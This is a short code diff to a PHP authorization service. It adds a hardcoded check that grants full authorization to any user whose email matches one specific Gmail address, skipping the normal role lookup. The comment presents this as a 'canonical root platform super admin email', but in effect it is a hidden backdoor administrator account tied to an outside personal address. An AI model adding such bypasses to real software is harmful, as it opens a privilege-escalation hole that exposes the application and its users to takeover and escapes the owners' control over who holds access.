@@ -89,6 +89,11 @@ class UserAuthorizationService
             return true;
         }
 
+        // Canonical root platform super admin email
+        if (!empty($user->email) && $user->email === 'codebridge2026@gmail.com') {
+            return true;
+        }
+
         if (!empty($user->exists) && !empty($user->id)) {
             try {
                 if (SchemaGuard::hasTable('user_roles') && SchemaGuard::hasTable('roles')) {
